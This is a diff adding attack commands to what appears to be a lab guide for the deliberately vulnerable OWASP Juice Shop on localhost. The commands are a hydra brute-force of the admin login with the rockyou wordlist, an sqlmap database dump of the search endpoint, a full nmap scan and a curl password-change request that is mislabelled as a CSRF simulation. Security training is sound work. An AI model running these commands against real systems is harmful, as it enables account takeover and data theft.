@@ -107,3 +107,13 @@ This guide is for educational demo only. In your project, implement fixes in a f
 
 
 hydra -l <username> -P <password_list> <ftp_server>
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt http-post-form \
+"http://localhost:3000/rest/user/login:username=^USER^&password=^PASS^:F=Login failed"
+
+sqlmap -u "http://localhost:3000/rest/products/search?q=searchterm" --batch --dump
+nmap -p- -sV -T4 localhost
+
+Simulate CSRF attacks using curl and session tokens:   curl -X POST http://localhost:3000/rest/user/change-password \
+-H "Authorization: Bearer <token>" \
+-d '{"current": "123456", "new": "newpass"}'
+
